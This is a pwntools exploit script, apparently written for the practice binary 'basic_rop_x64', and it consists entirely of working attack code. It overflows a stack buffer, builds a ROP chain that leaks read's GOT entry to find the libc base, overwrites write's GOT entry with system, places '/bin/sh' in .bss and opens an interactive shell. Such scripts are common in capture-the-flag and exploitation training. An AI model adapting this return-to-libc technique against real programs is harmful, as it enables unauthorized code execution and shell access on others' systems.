from pwn import *

def slog(name, addr):
    return success(": ".join([name, hex(addr)]))


p = process("./basic_rop_x64")
e = ELF("./basic_rop_x64")
libc = e.libc
r = ROP(e)

context.log_level = 'debug'
gdb.attach(p)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
bss = e.bss()

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']

ret = r.find_gadget(['ret'])[0]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

payload = b'A' * 72


# write(1, read@got, 8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)


# read(0, bss, 8)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(bss) + p64(8)
payload += p64(read_plt)


# read(0, write@got, 8)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(write_got) + p64(8)
payload += p64(read_plt)


# write("/bin/sh")
payload += p64(ret)
payload += p64(pop_rdi) + p64(bss)
payload += p64(write_plt)


p.send(payload)

p.recvuntil(b'A' * 64)
read = u64(p.recvn(6)+b'\x00'*2)
lb = read - read_offset
system = lb + system_offset

slog("libc base", lb)
slog("read", read)
slog("system", system)


p.send(b"/bin/sh\x00")
p.send(p64(system))

p.interactive()

